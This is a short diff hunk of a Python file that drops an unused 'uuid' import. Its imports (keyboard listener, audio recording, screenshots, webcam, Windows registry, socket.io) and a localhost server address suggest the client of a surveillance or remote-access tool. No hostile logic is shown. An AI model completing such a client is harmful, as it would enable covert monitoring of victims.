@@ -2,7 +2,7 @@
 
 import platform, socket, winreg, subprocess, requests, socketio
 from pynput import keyboard
-import sounddevice, soundfile, pyautogui, os, uuid, cv2, time
+import sounddevice, soundfile, pyautogui, os, cv2, time
 
 server_ip = 'localhost'
 server_port = 8000
